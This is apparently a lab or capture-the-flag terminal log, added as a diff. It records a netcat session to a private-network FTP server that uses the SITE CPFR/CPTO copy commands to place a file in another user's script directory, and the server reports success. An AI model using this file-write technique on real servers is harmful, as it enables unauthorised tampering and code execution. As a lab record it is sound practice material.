@@ -1,0 +1,13 @@
+Script started on 2020-09-26 01:43:17-03:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="166" LINES="33"]
+root@Pentest:/home/joaofracassi/beco-xpl/joy# 
+root@Pentest:/home/joaofracassi/beco-xpl/joy# ftp[K[K[Kd[Kftp[K[K[Knc -v[K[K192.168.1.106 21
+220 The Good Tech Inc. FTP Server
+site cpfr /home/ftp/test
+350 File or directory exists, ready for destination name
+site cpto /home/patrick/script/test
+250 Copy successful
+  ^C
+root@Pentest:/home/joaofracassi/beco-xpl/joy# exit
+exit
+
+Script done on 2020-09-26 01:48:13-03:00 [COMMAND_EXIT_CODE="1"]
